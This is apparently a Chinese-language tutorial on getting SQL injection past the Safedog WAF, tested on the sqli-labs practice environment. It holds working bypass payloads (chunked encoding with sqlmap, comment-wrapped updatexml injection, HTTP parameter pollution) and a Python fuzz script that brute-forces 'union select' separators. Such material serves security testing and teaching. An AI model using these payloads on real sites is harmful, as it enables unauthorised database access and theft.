## SQL注入绕WAF

测试WAF：安全狗

测试环境：sqlilab

 ### 分块编码传输

使用最新版安全狗进行测试，测试关卡为sqlilab得第11关

![](media\2020-01-01.png)

可以看到我们使用报错注入直接被安全狗拦截了，接下来使用分块编码传输尝试。

![](media\2020-01-02.png)

可以看到已经通过报错获得了当前用户的用户名。

结合sqlmap使用得话可以用以下方法

* 将burp得proxy设置为自动进行分块传输![](media\2020-01-04.png)

  ![](media\2020-01-05.png)

* ```
  sqlmap执行命令：python sqlmap.py -r test.txt --proxy=http://127.0.0.1:8080
  ```

  ![](media\2020-01-06.png)

### 安全狗特性绕WAF

安全狗会自动忽略/**/中的内容，利用这点我们构造出如下语句：

```
http://localhost/sqllab/Less-1/?a=/*&id=1%27%20and%20updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--+*/
```

![](media\2020-01-03.png)

### FUZZ

首先要找到被过滤的点，是union、select、还是union select得组合。然后进行fuzz。这种情况多适用于对一个如union select这个组合进行过滤得情况。

附：fuzz脚本

```
#!-*- coding:utf-8 -*-
#!/usr/bin/env python

import requests, sys

fuzz_zs = ['/*','*/','/*!','/**/','?','/','*','=','`','~','@','|','!','%','.','-','+','%00','%20','%09','%0a','%0d','%0c','%0d','%a0']
fuzz_sz = ['']
fuzz_ch = ['%0a','%0d','%0c','%0d','%0e','%0f','%0g','%0h','%0i','%0j','%0h','%0i','%0j','%0k','%0l','%0m','%0n','%0o','%0p','%0q','%0r','%0s','%0t','%0u','%0v','%0w','%0x','%0y','%0z']

fuzz = fuzz_zs + fuzz_sz + fuzz_ch
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'}

url_start = 'http://192.168.25.133/sql.php?id=1'

lens = len(fuzz)**4
num = 0
#只嵌套了4层
for a in fuzz:
	for b in fuzz:
		for c in fuzz:
			for d in fuzz:
				num += 1
				payload = "/*!union" + a + b + c + d + "select*/ 1,2,3"
				url = url_start + payload
				print("Now URL:" + url)
				print "Process %s / %s"%(num,str(lens))
				# sys.stdout.write("Process：%s / %s \r"%(num,str(lens)))
				# sys.stdout.flush()
				res = requests.get(url,headers=headers)
				if "hhhhtest" in res.text:
					with open('Result.txt','a') as r:
						r.write(url + "\n")
```



 https://mp.weixin.qq.com/s/1OoK-57IogCABWAlkp2S5A 

### HPP污染

HPP污染在绕过waf中有两种应用场景

* 以http://localhost/aaa.php?id=1&id=union select 1,2,3--+为例，WAF可能取第一个id，而服务器则取最后一个id值。这样可以达到绕过waf得效果。
* 服务器可能会将两个相同字段得值拼接在一起，如http://localhost/aaa.php?id=1' union&id=select 1,2,3--+ 。waf对两块分离都没有告警，而两者在后端拼接在一起时就会产生注入效果。

 https://cloud.tencent.com/developer/article/1516333 

### 附加内容：

分块编码传输插件： https://github.com/c0ny1/chunked-coding-converter 

SQLServer Bypass安全狗

https://blog.csdn.net/qq_41210745/article/details/102952607 